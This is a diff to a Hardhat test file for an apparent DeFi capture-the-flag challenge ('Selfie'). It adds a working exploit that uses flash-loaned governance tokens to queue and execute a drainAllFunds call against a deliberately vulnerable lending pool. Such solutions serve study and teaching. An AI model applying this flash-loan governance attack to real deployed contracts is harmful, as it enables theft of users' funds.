@@ -31,6 +31,34 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // Idea: use governance queueAction to call drainAllFunds on SelfiePool
+        // receiver: attacker
+        // calldata: drainAllFunds(attacker.address)
+        // 
+        // Caveats:
+        // - make sure attacker has enough governance votes to queueAction
+        // - make sure weiAmount sent is enough to pay for gas
+
+        // You need > half of all DVT tokens to propose action, flashloan then we can call executeAction
+
+        [deployer, attacker] = await ethers.getSigners();
+        const AttackFactory = await ethers.getContractFactory('AttackSelfie', attacker);
+        // I think DVTSnapshot is an extension of ERC20 DVT contract
+        this.attackFactory = await AttackFactory.deploy(this.token.address, this.pool.address, this.governance.address, this.token.address);
+
+        let ABI = [
+            "function drainAllFunds(address receiver)"
+        ];
+        let iface = new ethers.utils.Interface(ABI);
+        const calldata = iface.encodeFunctionData("drainAllFunds", [ attacker.address ]);
+        console.log(calldata);
+
+        await this.attackFactory.connect(attacker).attack(calldata);
+
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+
+        await this.attackFactory.connect(attacker).finishHim();
     });
 
     after(async function () {
